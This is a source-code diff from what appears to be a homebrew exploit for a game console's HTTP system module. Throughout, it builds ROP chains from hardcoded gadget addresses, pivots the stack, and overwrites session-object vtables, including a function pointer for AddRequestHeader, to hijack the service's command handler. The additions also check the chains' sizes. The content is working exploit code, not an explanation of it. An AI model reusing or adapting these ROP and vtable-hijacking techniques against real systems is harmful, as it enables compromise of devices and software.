@@ -52,6 +52,8 @@ u32 ROP_HTTPC_CMDHANDLER_RETURN = 0x00114bf4;//Code to jump to in httpc_cmdhandl
 
 u32 ROP_sharedmem_create = 0x001045a4;
 
+u32 ROP_http_context_getctxptr = 0x0010b8d8;//inr0=_this inr1=contexthandle
+
 u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
 
 u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.
@@ -60,8 +62,8 @@ u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
 u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the context-session.
 u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
 
-static u32 __custom_mainservsession_vtable = 0x0f000000 + 0xd00;
-static u32 __custom_contextservsession_vtable = 0x0f000000 + 0xd00 - 0x108;
+static u32 __custom_mainservsession_vtable = 0x0f000000 + 0xf00 - 0x108;
+static u32 __custom_contextservsession_vtable = 0x0f000000 + 0xf00 - 0x108*2;
 
 static u32 __httpmainthread_cmdhandler_stackframe = 0x0ffffe28;
 
@@ -156,7 +158,7 @@ void ropgen_blxr3(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 writestackre
 	}
 }
 
-void ropgen_setr0r2r1(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x40-bytes.
+void ropgen_setr0r2r1(u32 **ropchain, u32 *http_ropvaddr, u32 value)//Total size: 0x3c-bytes.
 {
 	u32 regs[9] = {0};
 
@@ -237,7 +239,7 @@ void ropgen_blxip_popr3pc(u32 **ropchain, u32 *http_ropvaddr, u32 addr, u32 r3va
 	ropgen_addword(ropchain, http_ropvaddr, r3val);
 }
 
-void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x78-bytes.
+void ropgen_callfunc(u32 **ropchain, u32 *http_ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x80-bytes. params[0](r0) is at offset 0x40. params[1](r1) is at offset 0x50.
 {
 	ropgen_setr0r2r1(ropchain, http_ropvaddr, params[2]);
 	ropgen_setr0(ropchain, http_ropvaddr, params[0]);
@@ -499,14 +501,18 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	u32 *ropchain = (u32*)ropvmem_sharedmem;
 	u32 ropvaddr = 0x0f000000;
 
-	u32 createcontext_ropoffset = 0x400;
+	u32 createcontext_ropoffset = 0x300;
 	u32 createcontext_bakropoff = 0x800;
 	u32 createcontext_roplaunch_bakaddr;
 	u32 createcontext_roplaunch_baksize;
 
+	u32 created_contexthandle_stackaddr;
+
 	u32 ropheap = 0x0ffff000;//Main-thread stack-bottom.
 
 	u32 *ptr;
+
+	u32 params[7] = {0};
 
 	//Setup the ROP-chain used by the CreateContext vtable funcptr.
 
@@ -514,8 +520,14 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe + 24 + 12, ropheap+0x4, 0x3);//Copy the _this value for httpc_cmdhandler, from the saved r7 in the httpc_cmdhandler stackframe to ropheap+0x4.
 
 	//Copy the backup CreateContext ROP-chain to the main offset then pivot to the main CreateContext ROP-chain.
-	ropgen_memcpy(&ropchain, &ropvaddr, 0x0f000000+createcontext_ropoffset, 0x0f000000+createcontext_bakropoff, 0x400);
+	ropgen_memcpy(&ropchain, &ropvaddr, 0x0f000000+createcontext_ropoffset, 0x0f000000+createcontext_bakropoff, 0x500);
 	ropgen_stackpivot(&ropchain, &ropvaddr, 0x0f000000+createcontext_ropoffset);
+
+	if(ropvaddr-0x0f000000 > createcontext_ropoffset)
+	{
+		printf("The initial CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-0x0f000000 - createcontext_ropoffset));
+		return -2;
+	}
 
 	//Create a backup of the above ROP.
 	createcontext_roplaunch_bakaddr = ropvaddr+0x100;
@@ -534,13 +546,47 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	ropgen_setr4(&ropchain, &ropvaddr, 0);
 
 	ropgen_addword(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_CREATECONTEXT);
+	created_contexthandle_stackaddr = ropvaddr+4;
 	ropgen_addwords(&ropchain, &ropvaddr, 0, 6 + 7);//"add sp, sp, #24" "pop {r4..sl, pc}"
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original modified one.
 
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//r0 = _this
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x10);//r0+= 0x10.
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);//r0 = *(_this+16);
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x8, 1);//Write *(_this+16) to ropheap+0x8.
+
+	ropgen_copyu32(&ropchain, &ropvaddr, created_contexthandle_stackaddr, ropheap+0xc, 0x3);//Copy the contexthandle to ropheap+0xc.
+
+	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x8, ropvaddr + 0x40 + 0x40 + 0x40, 0x3);//Copy the above objptr to the value which will be used for r0 in the below func-call.
+
+	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0xc, ropvaddr + 0x40 + 0x50, 0x3);//Copy the contexthandle to the value which which will be used for r1 in the below func-call.
+
+	ropgen_callfunc(&ropchain, &ropvaddr,ROP_http_context_getctxptr, params);
+
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x10, 1);//Write the contextptr to ropheap+0x10. This is the same object from httpc_cmdhandler *(_this+16) for context-sessions.
+
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_writeu32(&ropchain, &ropvaddr, __custom_contextservsession_vtable, 0, 0);//Overwrite the vtable for the above object.
+
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_RETURN, __httpmainthread_cmdhandler_stackframe-4, 1);
 
 	ropgen_stackpivot(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe-4);
+
+	if(ropvaddr-0x0f000000 > createcontext_bakropoff)
+	{
+		printf("The main CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-0x0f000000 - createcontext_bakropoff));
+		return -2;
+	}
+
+	ropvaddr = ropvaddr - createcontext_ropoffset + createcontext_bakropoff;
+	if(ropvaddr > __custom_contextservsession_vtable)
+	{
+		printf("The backup version of the main CreateContext ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - __custom_contextservsession_vtable));
+		return -2;
+	}
 
 	//Setup the custom vtable for main serv session.
 	ptr = (u32*)&ropvmem_sharedmem[(__custom_mainservsession_vtable - 0x0f000000) >> 2];
@@ -550,6 +596,7 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	//Setup the custom vtable for context-session.
 	ptr = (u32*)&ropvmem_sharedmem[(__custom_contextservsession_vtable - 0x0f000000) >> 2];
 	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE);
+	ptr[0x80>>2] = 0x90909090;//Overwrite the vtable funcptr for AddRequestHeader.
 
 	//Overwrite every vtable ptr with the target value with the custom one.
 
